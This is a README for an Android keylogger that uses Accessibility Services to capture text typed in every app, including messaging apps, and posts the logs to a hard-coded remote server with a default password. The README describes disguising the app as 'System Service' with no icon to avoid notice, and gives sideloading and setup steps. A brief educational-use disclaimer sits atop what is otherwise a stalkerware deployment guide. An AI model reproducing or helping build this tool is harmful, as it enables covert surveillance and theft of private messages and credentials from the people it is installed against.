# Android Keylogger

A keylogger application for Android that captures keyboard input using Accessibility Services and sends logs to a remote server.

> **⚠️ LEGAL WARNING**: This application is for educational and authorized monitoring purposes only. Unauthorized use of keyloggers may violate privacy laws. Use responsibly and only on devices you own or have explicit permission to monitor.

## Features

- ✅ Captures text input from all applications
- ✅ Logs with timestamps
- ✅ Automatic periodic upload to server (configurable interval)
- ✅ Manual log sending option
- ✅ Configurable server endpoint and credentials
- ✅ Package name context for each log entry
- ✅ Filters modifier keys (SHIFT, CTRL, ALT, etc.)
- ✅ Persistent storage of logs

## Architecture

This app uses Android's **Accessibility Service** API to capture text input events. The main components are:

- **MainActivity**: UI for configuration and service management
- **KeyloggerService**: Accessibility service that captures text input
- **LogManager**: Handles log file operations (read/write/clear)
- **NetworkManager**: Manages HTTP communication with server

## Server API

The app sends logs to your server using HTTP POST with the following parameters:

```
action: add_result
password: [your_password]
command: keylogger_logs
result: [captured_logs]
```

Default endpoint: `http://jalalshop.pk/api2/commands.php`

## Installation

### Prerequisites

- Android device running Android 5.0 (API 21) or higher
- Android Studio (for building from source)
- Or download the pre-built APK

### Building from Source

1. Clone or download this project
2. Open in Android Studio
3. Build the APK: `Build > Build Bundle(s) / APK(s) > Build APK(s)`
4. The APK will be in `app/build/outputs/apk/debug/`

### Installing the APK

1. Transfer the APK to your Android device
2. Enable "Install from Unknown Sources" in Settings
3. Open the APK file and install
4. Open the app

### Enabling the Service

1. Tap "Enable Service" button in the app
2. Find "System Service" in the Accessibility settings list
3. Toggle it ON
4. Accept the permission warning
5. Return to the app - status should show "Service Enabled"

## Configuration

You can configure the following settings in the app:

- **Server URL**: The endpoint where logs will be sent
- **Password**: Authentication password for the server
- **Send Interval**: How often logs are sent (in seconds, minimum 10)

Default values:
- Server URL: `http://jalalshop.pk/api2/commands.php`
- Password: `patato`
- Interval: `60` seconds

## Usage

Once the accessibility service is enabled:

1. The app will automatically capture text input from all apps
2. Logs are stored locally in the app's private storage
3. Logs are automatically sent to the server at the configured interval
4. You can manually send logs anytime using the "Send Logs Now" button

## Log Format

Logs are formatted as:
```
[YYYY-MM-DD HH:MM:SS] [package.name] captured_text
```

Example:
```
[2025-11-25 11:30:45] [com.whatsapp] Hello world
[2025-11-25 11:31:02] [com.android.chrome] search query
```

## Permissions

The app requires:
- **INTERNET**: To send logs to the server
- **ACCESS_NETWORK_STATE**: To check network connectivity
- **BIND_ACCESSIBILITY_SERVICE**: To capture keyboard input

## Security Considerations

- Logs are stored in the app's private directory (not accessible to other apps)
- Communication with server uses HTTP (consider using HTTPS in production)
- The app name is disguised as "System Service" to be less conspicuous
- No special icon is used to reduce visibility

## Limitations

- **Cannot be published on Google Play Store** due to Accessibility Service policy violations
- May trigger security warnings on some devices
- Requires manual installation via APK
- User must manually enable the Accessibility Service
- Some apps may block accessibility services or use secure input fields

## Troubleshooting

**Service won't enable:**
- Make sure you're selecting the correct app in Accessibility settings
- Try restarting the device
- Check that the app has all required permissions

**Logs not being sent:**
- Check your internet connection
- Verify the server URL is correct
- Check server logs to ensure it's receiving requests
- Try manual send to test connectivity

**Not capturing text:**
- Ensure the service is enabled in Accessibility settings
- Some apps use secure text fields that block accessibility services
- Try typing in a different app (e.g., Messages, Chrome)

## Development

### Project Structure
```
app/src/main/
├── java/com/keylogger/
│   ├── MainActivity.java          # Main UI activity
│   ├── KeyloggerService.java      # Accessibility service
│   ├── LogManager.java            # Log file operations
│   └── NetworkManager.java        # Server communication
├── res/
│   ├── layout/
│   │   └── activity_main.xml      # UI layout
│   ├── values/
│   │   └── strings.xml            # String resources
│   └── xml/
│       └── accessibility_service_config.xml
└── AndroidManifest.xml
```

### Dependencies
- OkHttp 4.11.0 for HTTP requests
- AndroidX AppCompat and Material Design

## Comparison with Python Version

| Feature | Python Version | Android Version |
|---------|---------------|-----------------|
| Keystroke capture | ✅ pynput | ✅ Accessibility Service |
| Timestamps | ✅ | ✅ |
| Log buffering | ✅ | ✅ |
| Server upload | ✅ | ✅ |
| Periodic sending | ✅ (60s) | ✅ (configurable) |
| Modifier filtering | ✅ | ✅ |
| Hidden operation | ✅ | ⚠️ (requires user permission) |
| Auto-start | ✅ | ⚠️ (service persists after enable) |

## License

This project is for educational purposes only. Use at your own risk and ensure compliance with all applicable laws.

## Disclaimer

The authors are not responsible for any misuse of this software. This tool should only be used for legitimate purposes such as:
- Monitoring your own devices
- Parental control with proper consent
- Security research in controlled environments
- Educational purposes

Unauthorized surveillance is illegal in most jurisdictions.
